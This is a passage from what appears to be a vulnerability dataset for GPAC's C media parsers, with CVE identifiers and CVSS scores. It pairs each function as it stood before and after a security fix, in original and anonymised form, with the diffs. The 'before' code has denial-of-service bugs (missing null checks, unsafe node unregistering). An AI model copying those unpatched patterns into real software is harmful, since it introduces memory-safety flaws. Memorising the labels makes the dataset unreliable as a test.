		if (VAR_5->vui.nal_hrd_parameters_present_flag)
			if (avc_parse_hrd_parameters(VAR_0, &VAR_5->vui.hrd)<0) return -1;

		VAR_5->vui.vcl_hrd_parameters_present_flag = gf_bs_read_int_log(VAR_0, 1, ""vcl_hrd_parameters_present_flag"");
		if (VAR_5->vui.vcl_hrd_parameters_present_flag)
			if (avc_parse_hrd_parameters(VAR_0, &VAR_5->vui.hrd)<0) return -1;

		if (VAR_5->vui.nal_hrd_parameters_present_flag || VAR_5->vui.vcl_hrd_parameters_present_flag)
			VAR_5->vui.low_delay_hrd_flag = gf_bs_read_int_log(VAR_0, 1, ""low_delay_hrd_flag"");

		VAR_5->vui.pic_struct_present_flag = gf_bs_read_int_log(VAR_0, 1, ""pic_struct_present_flag"");
	}
	/* COMMENT_16 */

	if (VAR_2) {
		if ((VAR_9 == 83) || (VAR_9 == 86)) {
			u8 VAR_40;
			/* COMMENT_17 */

			gf_bs_read_int_log(VAR_0, 1, ""inter_layer_deblocking_filter_control_present_flag"");
			VAR_40 = gf_bs_read_int_log(VAR_0, 2, ""extended_spatial_scalability_idc"");
			if (VAR_5->ChromaArrayType == 1 || VAR_5->ChromaArrayType == 2) {
				gf_bs_read_int_log(VAR_0, 1, ""chroma_phase_x_plus1_flag"");
			}
			if (VAR_5->ChromaArrayType == 1) {
				gf_bs_read_int_log(VAR_0, 2, ""chroma_phase_y_plus1"");
			}
			if (VAR_40 == 1) {
				if (VAR_5->ChromaArrayType > 0) {
					gf_bs_read_int_log(VAR_0, 1, ""seq_ref_layer_chroma_phase_x_plus1_flag"");
					gf_bs_read_int_log(VAR_0, 2, ""seq_ref_layer_chroma_phase_y_plus1"");
				}
				gf_bs_read_se_log(VAR_0, ""seq_scaled_ref_layer_left_offset"");
				gf_bs_read_se_log(VAR_0, ""seq_scaled_ref_layer_top_offset"");
				gf_bs_read_se_log(VAR_0, ""seq_scaled_ref_layer_right_offset"");
				gf_bs_read_se_log(VAR_0, ""seq_scaled_ref_layer_bottom_offset"");
			}
			if (gf_bs_read_int_log(VAR_0, 1, ""seq_tcoeff_level_prediction_flag"")) {
				gf_bs_read_int_log(VAR_0, 1, ""adaptive_tcoeff_level_prediction_flag"");
			}
			gf_bs_read_int_log(VAR_0, 1, ""slice_header_restriction_flag"");

			if (gf_bs_read_int_log(VAR_0, 1, ""svc_vui_parameters_present"")) {
				u32 VAR_41 = gf_bs_read_ue_log(VAR_0, ""vui_ext_num_entries_minus1"");

				for (VAR_12 = 0; VAR_12 <= VAR_41; VAR_12++) {
					u8 VAR_42, VAR_43, VAR_44;
					gf_bs_read_int_log(VAR_0, 3, ""vui_ext_dependency_id"");
					gf_bs_read_int_log(VAR_0, 4, ""vui_ext_quality_id"");
					gf_bs_read_int_log(VAR_0, 3, ""vui_ext_temporal_id"");
					VAR_44 = gf_bs_read_int_log(VAR_0, 1, ""vui_ext_timing_info_present_flag"");
					if (VAR_44) {
						gf_bs_read_int_log(VAR_0, 32, ""vui_ext_num_units_in_tick"");
						gf_bs_read_int_log(VAR_0, 32, ""vui_ext_time_scale"");
						gf_bs_read_int_log(VAR_0, 1, ""vui_ext_fixed_frame_rate_flag"");
					}
					VAR_42 = gf_bs_read_int_log(VAR_0, 1, ""vui_ext_nal_hrd_parameters_present_flag"");
					if (VAR_42) {
						/* COMMENT_18 */
					}
					VAR_43 = gf_bs_read_int_log(VAR_0, 1, ""vui_ext_vcl_hrd_parameters_present_flag"");
					if (VAR_43) {
						/* COMMENT_18 */
					}
					if (VAR_42 || VAR_43) {
						gf_bs_read_int_log(VAR_0, 1, ""vui_ext_low_delay_hrd_flag"");
					}
					gf_bs_read_int_log(VAR_0, 1, ""vui_ext_pic_struct_present_flag"");
				}
			}
		}
		else if ((VAR_9 == 118) || (VAR_9 == 128)) {
			GF_LOG(VAR_45, VAR_32, (""[avc-h264] MVC parsing not implemented - skipping parsing end of Subset SPS\n""));
			return VAR_8;
		}

		if (gf_bs_read_int_log(VAR_0, 1, ""additional_extension2"")) {
			GF_LOG(VAR_39, VAR_32, (""[avc-h264] skipping parsing end of Subset SPS (additional_extension2)\n""));
			return VAR_8;
		}
	}
	return VAR_8;
}",gpac/e2acb1511d1e69115141ea3080afd1cce6a15497/av_parsers.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -226,11 +226,11 @@
 
 		sps->vui.nal_hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""nal_hrd_parameters_present_flag"");
 		if (sps->vui.nal_hrd_parameters_present_flag)
-			avc_parse_hrd_parameters(bs, &sps->vui.hrd);
+			if (avc_parse_hrd_parameters(bs, &sps->vui.hrd)<0) return -1;
 
 		sps->vui.vcl_hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""vcl_hrd_parameters_present_flag"");
 		if (sps->vui.vcl_hrd_parameters_present_flag)
-			avc_parse_hrd_parameters(bs, &sps->vui.hrd);
+			if (avc_parse_hrd_parameters(bs, &sps->vui.hrd)<0) return -1;
 
 		if (sps->vui.nal_hrd_parameters_present_flag || sps->vui.vcl_hrd_parameters_present_flag)
 			sps->vui.low_delay_hrd_flag = gf_bs_read_int_log(bs, 1, ""low_delay_hrd_flag"");","{'deleted_lines': ['\t\t\tavc_parse_hrd_parameters(bs, &sps->vui.hrd);', '\t\t\tavc_parse_hrd_parameters(bs, &sps->vui.hrd);'], 'added_lines': ['\t\t\tif (avc_parse_hrd_parameters(bs, &sps->vui.hrd)<0) return -1;', '\t\t\tif (avc_parse_hrd_parameters(bs, &sps->vui.hrd)<0) return -1;']}",True,"An infinite loop vulnerability exists in gpac 1.1.0 in the gf_log function, which causes a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-10T09:03:11Z,4
CVE-2021-45760,['CWE-119'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #1966,5041fcbaa904a89d280561905a163171b3828cea,https://github.com/gpac/gpac/commit/5041fcbaa904a89d280561905a163171b3828cea,src/scene_manager/scene_dump.c,dump_od_to_saf,"static void dump_od_to_saf(GF_SceneDumper *dumper, GF_AUContext *au, u32 indent)
{
u32 i, count;
count = gf_list_count(au->commands);
for (i=0; i<count; i++) {
u32 j, c2;
GF_ODUpdate *com = (GF_ODUpdate *)gf_list_get(au->commands, i);
if (com->tag != GF_ODF_OD_UPDATE_TAG) continue;
c2 = gf_list_count(com->objectDescriptors);
for (j=0; j<c2; j++) {
GF_ObjectDescriptor *od = (GF_ObjectDescriptor *)gf_list_get(com->objectDescriptors, j);
GF_ESD *esd = (GF_ESD *) gf_list_get(od->ESDescriptors, 0);
GF_MuxInfo *mux;
if (!esd || (esd->tag != GF_ODF_ESD_TAG)) {
if (od->URLString) {
gf_fprintf(dumper->trace, ""<saf:RemoteStreamHeader streamID=\""stream%d\"" url=\""%s\"""", au->owner->ESID, od->URLString);
if (au->timing) gf_fprintf(dumper->trace, "" time=\""""LLD""\"""", au->timing);
gf_fprintf(dumper->trace, ""/>\n"");
}
continue;
}
mux = (GF_MuxInfo *)gf_list_get(esd->extensionDescriptors, 0);
if (!mux || (mux->tag!=GF_ODF_MUXINFO_TAG)) mux = NULL;
gf_fprintf(dumper->trace, ""<saf:mediaHeader streamID=\""stream%d\"""", esd->ESID);
gf_fprintf(dumper->trace, "" streamType=\""%d\"" objectTypeIndication=\""%d\"" timeStampResolution=\""%d\"""", esd->decoderConfig->streamType, esd->decoderConfig->objectTypeIndication, au->owner->timeScale);
if (au->timing) gf_fprintf(dumper->trace, "" time=\""""LLD""\"""", au->timing);
if (mux && mux->file_name) gf_fprintf(dumper->trace, "" source=\""%s\"""", mux->file_name);
gf_fprintf(dumper->trace, ""/>\n"");
}
}
gf_fprintf(dumper->trace, ""</saf:mediaUnit>\n"");
}","static void dump_od_to_saf(GF_SceneDumper *VAR_0, GF_AUContext *VAR_1, u32 VAR_2)
{
u32 VAR_3, VAR_4;
VAR_4 = gf_list_count(VAR_1->commands);
for (VAR_3=0; VAR_3<VAR_4; VAR_3++) {
u32 VAR_5, VAR_6;
GF_ODUpdate *VAR_7 = (GF_ODUpdate *)gf_list_get(VAR_1->commands, VAR_3);
if (VAR_7->tag != VAR_8) continue;
VAR_6 = gf_list_count(VAR_7->objectDescriptors);
for (VAR_5=0; VAR_5<VAR_6; VAR_5++) {
GF_ObjectDescriptor *VAR_9 = (GF_ObjectDescriptor *)gf_list_get(VAR_7->objectDescriptors, VAR_5);
GF_ESD *VAR_10 = (GF_ESD *) gf_list_get(VAR_9->ESDescriptors, 0);
GF_MuxInfo *VAR_11;
if (!VAR_10 || (VAR_10->tag != VAR_12)) {
if (VAR_9->URLString) {
gf_fprintf(VAR_0->trace, ""<saf:RemoteStreamHeader streamID=\""stream%d\"" url=\""%s\"""", VAR_1->owner->ESID, VAR_9->URLString);
if (VAR_1->timing) gf_fprintf(VAR_0->trace, "" time=\""""VAR_13""\"""", VAR_1->timing);
gf_fprintf(VAR_0->trace, ""/>\n"");
}
continue;
}
VAR_11 = (GF_MuxInfo *)gf_list_get(VAR_10->extensionDescriptors, 0);
if (!VAR_11 || (VAR_11->tag!=VAR_14)) VAR_11 = NULL;
gf_fprintf(VAR_0->trace, ""<saf:mediaHeader streamID=\""stream%d\"""", VAR_10->ESID);
gf_fprintf(VAR_0->trace, "" streamType=\""%d\"" objectTypeIndication=\""%d\"" timeStampResolution=\""%d\"""", VAR_10->decoderConfig->streamType, VAR_10->decoderConfig->objectTypeIndication, VAR_1->owner->timeScale);
if (VAR_1->timing) gf_fprintf(VAR_0->trace, "" time=\""""VAR_13""\"""", VAR_1->timing);
if (VAR_11 && VAR_11->file_name) gf_fprintf(VAR_0->trace, "" source=\""%s\"""", VAR_11->file_name);
gf_fprintf(VAR_0->trace, ""/>\n"");
}
}
gf_fprintf(VAR_0->trace, ""</saf:mediaUnit>\n"");
}",gpac/5041fcbaa904a89d280561905a163171b3828cea/scene_dump.c/vul/before/0.json,"static void dump_od_to_saf(GF_SceneDumper *dumper, GF_AUContext *au, u32 indent)
{
	u32 i, count;

	count = gf_list_count(au->commands);
	for (i=0; i<count; i++) {
		u32 j, c2;
		GF_ODUpdate *com = (GF_ODUpdate *)gf_list_get(au->commands, i);
		if (com->tag != GF_ODF_OD_UPDATE_TAG) continue;

		c2 = gf_list_count(com->objectDescriptors);
		for (j=0; j<c2; j++) {
			GF_ObjectDescriptor *od = (GF_ObjectDescriptor *)gf_list_get(com->objectDescriptors, j);
			GF_ESD *esd = (GF_ESD *) gf_list_get(od->ESDescriptors, 0);
			GF_MuxInfo *mux;
			if (!esd || (esd->tag != GF_ODF_ESD_TAG)) {
				if (od->URLString) {
					gf_fprintf(dumper->trace, ""<saf:RemoteStreamHeader streamID=\""stream%d\"" url=\""%s\"""", au->owner->ESID, od->URLString);
					if (au->timing) gf_fprintf(dumper->trace, "" time=\""""LLD""\"""", au->timing);
					gf_fprintf(dumper->trace, ""/>\n"");
				}
				continue;
			}
			mux = (GF_MuxInfo *)gf_list_get(esd->extensionDescriptors, 0);
			if (!mux || (mux->tag!=GF_ODF_MUXINFO_TAG)) mux = NULL;


			gf_fprintf(dumper->trace, ""<saf:mediaHeader streamID=\""stream%d\"""", esd->ESID);
			if (esd->decoderConfig) {
				gf_fprintf(dumper->trace, "" streamType=\""%d\"" objectTypeIndication=\""%d\"" timeStampResolution=\""%d\"""", esd->decoderConfig->streamType, esd->decoderConfig->objectTypeIndication, au->owner->timeScale);
			}
			if (au->timing) gf_fprintf(dumper->trace, "" time=\""""LLD""\"""", au->timing);
			if (mux && mux->file_name) gf_fprintf(dumper->trace, "" source=\""%s\"""", mux->file_name);
			gf_fprintf(dumper->trace, ""/>\n"");
		}


	}
	gf_fprintf(dumper->trace, ""</saf:mediaUnit>\n"");
}","static void dump_od_to_saf(GF_SceneDumper *VAR_0, GF_AUContext *VAR_1, u32 VAR_2)
{
	u32 VAR_3, VAR_4;

	VAR_4 = gf_list_count(VAR_1->commands);
	for (VAR_3=0; VAR_3<VAR_4; VAR_3++) {
		u32 VAR_5, VAR_6;
		GF_ODUpdate *VAR_7 = (GF_ODUpdate *)gf_list_get(VAR_1->commands, VAR_3);
		if (VAR_7->tag != VAR_8) continue;

		VAR_6 = gf_list_count(VAR_7->objectDescriptors);
		for (VAR_5=0; VAR_5<VAR_6; VAR_5++) {
			GF_ObjectDescriptor *VAR_9 = (GF_ObjectDescriptor *)gf_list_get(VAR_7->objectDescriptors, VAR_5);
			GF_ESD *VAR_10 = (GF_ESD *) gf_list_get(VAR_9->ESDescriptors, 0);
			GF_MuxInfo *VAR_11;
			if (!VAR_10 || (VAR_10->tag != VAR_12)) {
				if (VAR_9->URLString) {
					gf_fprintf(VAR_0->trace, ""<saf:RemoteStreamHeader streamID=\""stream%d\"" url=\""%s\"""", VAR_1->owner->ESID, VAR_9->URLString);
					if (VAR_1->timing) gf_fprintf(VAR_0->trace, "" time=\""""VAR_13""\"""", VAR_1->timing);
					gf_fprintf(VAR_0->trace, ""/>\n"");
				}
				continue;
			}
			VAR_11 = (GF_MuxInfo *)gf_list_get(VAR_10->extensionDescriptors, 0);
			if (!VAR_11 || (VAR_11->tag!=VAR_14)) VAR_11 = NULL;


			gf_fprintf(VAR_0->trace, ""<saf:mediaHeader streamID=\""stream%d\"""", VAR_10->ESID);
			if (VAR_10->decoderConfig) {
				gf_fprintf(VAR_0->trace, "" streamType=\""%d\"" objectTypeIndication=\""%d\"" timeStampResolution=\""%d\"""", VAR_10->decoderConfig->streamType, VAR_10->decoderConfig->objectTypeIndication, VAR_1->owner->timeScale);
			}
			if (VAR_1->timing) gf_fprintf(VAR_0->trace, "" time=\""""VAR_13""\"""", VAR_1->timing);
			if (VAR_11 && VAR_11->file_name) gf_fprintf(VAR_0->trace, "" source=\""%s\"""", VAR_11->file_name);
			gf_fprintf(VAR_0->trace, ""/>\n"");
		}


	}
	gf_fprintf(VAR_0->trace, ""</saf:mediaUnit>\n"");
}",gpac/5041fcbaa904a89d280561905a163171b3828cea/scene_dump.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -26,7 +26,9 @@
 
 
 			gf_fprintf(dumper->trace, ""<saf:mediaHeader streamID=\""stream%d\"""", esd->ESID);
-			gf_fprintf(dumper->trace, "" streamType=\""%d\"" objectTypeIndication=\""%d\"" timeStampResolution=\""%d\"""", esd->decoderConfig->streamType, esd->decoderConfig->objectTypeIndication, au->owner->timeScale);
+			if (esd->decoderConfig) {
+				gf_fprintf(dumper->trace, "" streamType=\""%d\"" objectTypeIndication=\""%d\"" timeStampResolution=\""%d\"""", esd->decoderConfig->streamType, esd->decoderConfig->objectTypeIndication, au->owner->timeScale);
+			}
 			if (au->timing) gf_fprintf(dumper->trace, "" time=\""""LLD""\"""", au->timing);
 			if (mux && mux->file_name) gf_fprintf(dumper->trace, "" source=\""%s\"""", mux->file_name);
 			gf_fprintf(dumper->trace, ""/>\n"");","{'deleted_lines': ['\t\t\tgf_fprintf(dumper->trace, "" streamType=\\""%d\\"" objectTypeIndication=\\""%d\\"" timeStampResolution=\\""%d\\"""", esd->decoderConfig->streamType, esd->decoderConfig->objectTypeIndication, au->owner->timeScale);'], 'added_lines': ['\t\t\tif (esd->decoderConfig) {', '\t\t\t\tgf_fprintf(dumper->trace, "" streamType=\\""%d\\"" objectTypeIndication=\\""%d\\"" timeStampResolution=\\""%d\\"""", esd->decoderConfig->streamType, esd->decoderConfig->objectTypeIndication, au->owner->timeScale);', '\t\t\t}']}",True,GPAC v1.1.0 was discovered to contain an invalid memory address dereference via the function gf_list_last(). This vulnerability allows attackers to cause a Denial of Service (DoS).,5.5,MEDIUM,1,valid,2021-12-13T10:23:01Z,4
CVE-2021-45763,['CWE-Other'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #1974,d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec,https://github.com/gpac/gpac/commit/d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec,src/bifs/com_dec.c,BD_DecFieldReplace,"static GF_Err BD_DecFieldReplace(GF_BifsDecoder * codec, GF_BitStream *bs)
{
GF_Err e;
u32 NodeID, ind, field_ind, NumBits;
GF_Node *node, *prev_node;
GF_ChildNodeItem *prev_child;
GF_FieldInfo field;
NodeID = 1 + gf_bs_read_int(bs, codec->info->config.NodeIDBits);
node = gf_sg_find_node(codec->current_graph, NodeID);
if (!node) return GF_NON_COMPLIANT_BITSTREAM;
NumBits = gf_get_bit_size(gf_node_get_num_fields_in_mode(node, GF_SG_FIELD_CODING_IN)-1);
ind = gf_bs_read_int(bs, NumBits);
e = gf_bifs_get_field_index(node, ind, GF_SG_FIELD_CODING_IN, &field_ind);
if (e) return e;
e = gf_node_get_field(node, field_ind, &field);
if (e) return e;
prev_node = NULL;
prev_child = NULL;
if (field.fieldType == GF_SG_VRML_SFNODE) {
prev_node = *((GF_Node **) field.far_ptr);
}
else if (field.fieldType == GF_SG_VRML_MFNODE) {
prev_child = * ((GF_ChildNodeItem **) field.far_ptr);
* ((GF_ChildNodeItem **) field.far_ptr) = NULL;
}
else if (!gf_sg_vrml_is_sf_field(field.fieldType)) {
gf_sg_vrml_mf_reset(field.far_ptr, field.fieldType);
}
codec->is_com_dec = GF_TRUE;
e = gf_bifs_dec_field(codec, bs, node, &field, GF_FALSE);
codec->is_com_dec = GF_FALSE;
if (field.fieldType == GF_SG_VRML_SFNODE) {
if (prev_node) e = gf_node_unregister(prev_node, node);
} else if (field.fieldType == GF_SG_VRML_MFNODE) {
gf_node_unregister_children(node, prev_child);
}
if (!e) gf_bifs_check_field_change(node, &field);
return e;
}","static GF_Err BD_DecFieldReplace(GF_BifsDecoder * VAR_0, GF_BitStream *VAR_1)
{
GF_Err VAR_2;
u32 VAR_3, VAR_4, VAR_5, VAR_6;
GF_Node *VAR_7, *VAR_8;
GF_ChildNodeItem *VAR_9;
GF_FieldInfo VAR_10;
VAR_3 = 1 + gf_bs_read_int(VAR_1, VAR_0->info->config.NodeIDBits);
VAR_7 = gf_sg_find_node(VAR_0->current_graph, VAR_3);
if (!VAR_7) return VAR_11;
VAR_6 = gf_get_bit_size(gf_node_get_num_fields_in_mode(VAR_7, VAR_12)-1);
VAR_4 = gf_bs_read_int(VAR_1, VAR_6);
VAR_2 = gf_bifs_get_field_index(VAR_7, VAR_4, VAR_12, &VAR_5);
if (VAR_2) return VAR_2;
VAR_2 = gf_node_get_field(VAR_7, VAR_5, &VAR_10);
if (VAR_2) return VAR_2;
VAR_8 = NULL;
VAR_9 = NULL;
if (VAR_10.fieldType == VAR_13) {
VAR_8 = *((GF_Node **) VAR_10.far_ptr);
}
else if (VAR_10.fieldType == VAR_14) {
VAR_9 = * ((GF_ChildNodeItem **) VAR_10.far_ptr);
* ((GF_ChildNodeItem **) VAR_10.far_ptr) = NULL;
}
else if (!gf_sg_vrml_is_sf_field(VAR_10.fieldType)) {
gf_sg_vrml_mf_reset(VAR_10.far_ptr, VAR_10.fieldType);
}
VAR_0->is_com_dec = VAR_15;
VAR_2 = gf_bifs_dec_field(VAR_0, VAR_1, VAR_7, &VAR_10, VAR_16);
VAR_0->is_com_dec = VAR_16;
if (VAR_10.fieldType == VAR_13) {
if (VAR_8) VAR_2 = gf_node_unregister(VAR_8, VAR_7);
} else if (VAR_10.fieldType == VAR_14) {
gf_node_unregister_children(VAR_7, VAR_9);
}
if (!VAR_2) gf_bifs_check_field_change(VAR_7, &VAR_10);
return VAR_2;
}",gpac/d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec/com_dec.c/vul/before/0.json,"static GF_Err BD_DecFieldReplace(GF_BifsDecoder * codec, GF_BitStream *bs)
{
	GF_Err e;
	u32 NodeID, ind, field_ind, NumBits;
	GF_Node *node;
	GF_ChildNodeItem *prev_child;
	GF_FieldInfo field;

	NodeID = 1 + gf_bs_read_int(bs, codec->info->config.NodeIDBits);
	node = gf_sg_find_node(codec->current_graph, NodeID);
	if (!node) return GF_NON_COMPLIANT_BITSTREAM;
	NumBits = gf_get_bit_size(gf_node_get_num_fields_in_mode(node, GF_SG_FIELD_CODING_IN)-1);
	ind = gf_bs_read_int(bs, NumBits);
	e = gf_bifs_get_field_index(node, ind, GF_SG_FIELD_CODING_IN, &field_ind);
	if (e) return e;

	e = gf_node_get_field(node, field_ind, &field);
	if (e) return e;

	prev_child = NULL;
	/*store prev MFNode content*/
	if (field.fieldType == GF_SG_VRML_MFNODE) {
		prev_child = * ((GF_ChildNodeItem **) field.far_ptr);
		* ((GF_ChildNodeItem **) field.far_ptr) = NULL;
	}
	/*regular field*/
	else if (!gf_sg_vrml_is_sf_field(field.fieldType)) {
		gf_sg_vrml_mf_reset(field.far_ptr, field.fieldType);
	}

	/*parse the field*/
	codec->is_com_dec = GF_TRUE;
	e = gf_bifs_dec_field(codec, bs, node, &field, GF_FALSE);
	codec->is_com_dec = GF_FALSE;
	/*remove prev nodes*/
	if (field.fieldType == GF_SG_VRML_MFNODE) {
		gf_node_unregister_children(node, prev_child);
	}
	if (!e) gf_bifs_check_field_change(node, &field);
	return e;
}","static GF_Err BD_DecFieldReplace(GF_BifsDecoder * VAR_0, GF_BitStream *VAR_1)
{
	GF_Err VAR_2;
	u32 VAR_3, VAR_4, VAR_5, VAR_6;
	GF_Node *VAR_7;
	GF_ChildNodeItem *VAR_8;
	GF_FieldInfo VAR_9;

	VAR_3 = 1 + gf_bs_read_int(VAR_1, VAR_0->info->config.NodeIDBits);
	VAR_7 = gf_sg_find_node(VAR_0->current_graph, VAR_3);
	if (!VAR_7) return VAR_10;
	VAR_6 = gf_get_bit_size(gf_node_get_num_fields_in_mode(VAR_7, VAR_11)-1);
	VAR_4 = gf_bs_read_int(VAR_1, VAR_6);
	VAR_2 = gf_bifs_get_field_index(VAR_7, VAR_4, VAR_11, &VAR_5);
	if (VAR_2) return VAR_2;

	VAR_2 = gf_node_get_field(VAR_7, VAR_5, &VAR_9);
	if (VAR_2) return VAR_2;

	VAR_8 = NULL;
	/* COMMENT_0 */
	if (VAR_9.fieldType == VAR_12) {
		VAR_8 = * ((GF_ChildNodeItem **) VAR_9.far_ptr);
		* ((GF_ChildNodeItem **) VAR_9.far_ptr) = NULL;
	}
	/* COMMENT_1 */
	else if (!gf_sg_vrml_is_sf_field(VAR_9.fieldType)) {
		gf_sg_vrml_mf_reset(VAR_9.far_ptr, VAR_9.fieldType);
	}

	/* COMMENT_2 */
	VAR_0->is_com_dec = VAR_13;
	VAR_2 = gf_bifs_dec_field(VAR_0, VAR_1, VAR_7, &VAR_9, VAR_14);
	VAR_0->is_com_dec = VAR_14;
	/* COMMENT_3 */
	if (VAR_9.fieldType == VAR_12) {
		gf_node_unregister_children(VAR_7, VAR_8);
	}
	if (!VAR_2) gf_bifs_check_field_change(VAR_7, &VAR_9);
	return VAR_2;
}",gpac/d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec/com_dec.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -2,7 +2,7 @@
 {
 	GF_Err e;
 	u32 NodeID, ind, field_ind, NumBits;
-	GF_Node *node, *prev_node;
+	GF_Node *node;
 	GF_ChildNodeItem *prev_child;
 	GF_FieldInfo field;
 
@@ -17,14 +17,9 @@
 	e = gf_node_get_field(node, field_ind, &field);
 	if (e) return e;
 
-	prev_node = NULL;
 	prev_child = NULL;
-	/*store prev SF node*/
-	if (field.fieldType == GF_SG_VRML_SFNODE) {
-		prev_node = *((GF_Node **) field.far_ptr);
-	}
 	/*store prev MFNode content*/
-	else if (field.fieldType == GF_SG_VRML_MFNODE) {
+	if (field.fieldType == GF_SG_VRML_MFNODE) {
 		prev_child = * ((GF_ChildNodeItem **) field.far_ptr);
 		* ((GF_ChildNodeItem **) field.far_ptr) = NULL;
 	}
@@ -38,9 +33,7 @@
 	e = gf_bifs_dec_field(codec, bs, node, &field, GF_FALSE);
 	codec->is_com_dec = GF_FALSE;
 	/*remove prev nodes*/
-	if (field.fieldType == GF_SG_VRML_SFNODE) {
-		if (prev_node) e = gf_node_unregister(prev_node, node);
-	} else if (field.fieldType == GF_SG_VRML_MFNODE) {
+	if (field.fieldType == GF_SG_VRML_MFNODE) {
 		gf_node_unregister_children(node, prev_child);
 	}
 	if (!e) gf_bifs_check_field_change(node, &field);","{'deleted_lines': ['\tGF_Node *node, *prev_node;', '\tprev_node = NULL;', '\t/*store prev SF node*/', '\tif (field.fieldType == GF_SG_VRML_SFNODE) {', '\t\tprev_node = *((GF_Node **) field.far_ptr);', '\t}', '\telse if (field.fieldType == GF_SG_VRML_MFNODE) {', '\tif (field.fieldType == GF_SG_VRML_SFNODE) {', '\t\tif (prev_node) e = gf_node_unregister(prev_node, node);', '\t} else if (field.fieldType == GF_SG_VRML_MFNODE) {'], 'added_lines': ['\tGF_Node *node;', '\tif (field.fieldType == GF_SG_VRML_MFNODE) {', '\tif (field.fieldType == GF_SG_VRML_MFNODE) {']}",True,GPAC v1.1.0 was discovered to contain an invalid call in the function gf_node_changed(). This vulnerability can lead to a Denial of Service (DoS).,5.5,MEDIUM,1,valid,2021-12-13T12:04:59Z,4
CVE-2021-45763,['CWE-Other'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #1974,d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec,https://github.com/gpac/gpac/commit/d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec,src/bifs/field_decode.c,gf_bifs_dec_node,"GF_Node *gf_bifs_dec_node(GF_BifsDecoder * codec, GF_BitStream *bs, u32 NDT_Tag)
{
u32 nodeID, NDTBits, node_type, node_tag, ProtoID, BVersion;
Bool skip_init, reset_qp14;
GF_Node *new_node;
GF_Err e;
GF_Proto *proto;
void SetupConditional(GF_BifsDecoder *codec, GF_Node *node);
char name[1000];
#if 0
if (!codec->info) {
codec->LastError = GF_BAD_PARAM;
return NULL;
}
#endif
BVersion = GF_BIFS_V1;
if (gf_bs_read_int(bs, 1)) {
nodeID = 1 + gf_bs_read_int(bs, codec->info->config.NodeIDBits);
if (nodeID == (u32) (1<<codec->info->config.NodeIDBits))
return NULL;
new_node = gf_sg_find_node(codec->current_graph, nodeID);
if (new_node && !gf_node_in_table(new_node, NDT_Tag)) {
GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, (""[BIFS] Node %s not allowed as field/child of NDT type %d\n"", gf_node_get_class_name(new_node), NDT_Tag));
codec->LastError = GF_SG_UNKNOWN_NODE;
return NULL;
}
if (!new_node) {
codec->LastError = GF_SG_UNKNOWN_NODE;
} else {
switch (gf_node_get_tag(new_node)) {
case TAG_MPEG4_Coordinate:
{
u32 nbCoord = ((M_Coordinate *)new_node)->point.count;
gf_bifs_dec_qp14_enter(codec, GF_TRUE);
gf_bifs_dec_qp14_set_length(codec, nbCoord);
gf_bifs_dec_qp14_enter(codec, GF_FALSE);
}
break;
case TAG_MPEG4_Coordinate2D:
{
u32 nbCoord = ((M_Coordinate2D *)new_node)->point.count;
gf_bifs_dec_qp14_enter(codec, GF_TRUE);
gf_bifs_dec_qp14_set_length(codec, nbCoord);
gf_bifs_dec_qp14_enter(codec, GF_FALSE);
}
break;
}
}
return new_node;
}
nodeID = 0;
name[0] = 0;
node_tag = 0;
proto = NULL;
while (1) {
NDTBits = gf_bifs_get_ndt_bits(NDT_Tag, BVersion);
if ((BVersion==1) && (NDTBits > 8 * gf_bs_available(bs)) ) {
codec->LastError = GF_OK;
return NULL;
}
node_type = gf_bs_read_int(bs, NDTBits);
if (node_type) break;
BVersion += 1;
if (BVersion > GF_BIFS_NUM_VERSION) {
codec->LastError = GF_BIFS_UNKNOWN_VERSION;
return NULL;
}
}
if (BVersion==2 && node_type==1) {
ProtoID = gf_bs_read_int(bs, codec->info->config.ProtoIDBits);
proto = gf_sg_find_proto(codec->current_graph, ProtoID, NULL);
if (!proto && codec->current_graph != codec->scenegraph)
proto = gf_sg_find_proto(codec->scenegraph, ProtoID, NULL);
if (!proto) {
codec->LastError = GF_SG_UNKNOWN_NODE;
return NULL;
}
} else {
node_tag = gf_bifs_ndt_get_node_type(NDT_Tag, node_type, BVersion);
}
if ((node_tag == TAG_MPEG4_IndexedFaceSet) && codec->info->config.Use3DMeshCoding) {
if (gf_bs_read_int(bs, 1)) {
gf_bs_read_int(bs, codec->info->config.NodeIDBits);
if (codec->UseName) gf_bifs_dec_name(bs, name, 1000);
}
return NULL;
}
if (!node_tag && !proto) {
codec->LastError = GF_SG_UNKNOWN_NODE;
return NULL;
}
if (gf_bs_read_int(bs, 1)) {
if (!codec->info->config.NodeIDBits) {
codec->LastError = GF_NON_COMPLIANT_BITSTREAM;
return NULL;
}
nodeID = 1 + gf_bs_read_int(bs, codec->info->config.NodeIDBits);
if (codec->UseName) gf_bifs_dec_name(bs, name, 1000);
}
new_node = NULL;
skip_init = GF_FALSE;
#if 0
if (nodeID && !codec->dec_memory_mode) {
new_node = gf_sg_find_node(codec->current_graph, nodeID);
if (new_node) {
if (proto) {
if ((gf_node_get_tag(new_node) != TAG_ProtoNode) || (gf_node_get_proto(new_node) != proto)) {
codec->LastError = GF_NON_COMPLIANT_BITSTREAM;
return NULL;
}
skip_init = 1;
} else {
if (gf_node_get_tag(new_node) != node_tag) {
codec->LastError = GF_NON_COMPLIANT_BITSTREAM;
return NULL;
}
skip_init = 1;
}
}
}
if (!new_node)
#endif
{
if (proto) {
new_node = gf_sg_proto_create_instance(codec->current_graph, proto);
if (! proto->ExternProto.count) skip_init = GF_TRUE;
} else {
new_node = gf_node_new(codec->current_graph, node_tag);
}
}
if (!new_node) {
codec->LastError = GF_NOT_SUPPORTED;
return NULL;
}
if (nodeID) {
if (strlen(name)) {
gf_node_set_id(new_node, nodeID, name);
} else {
gf_node_set_id(new_node, nodeID, NULL);
}
}
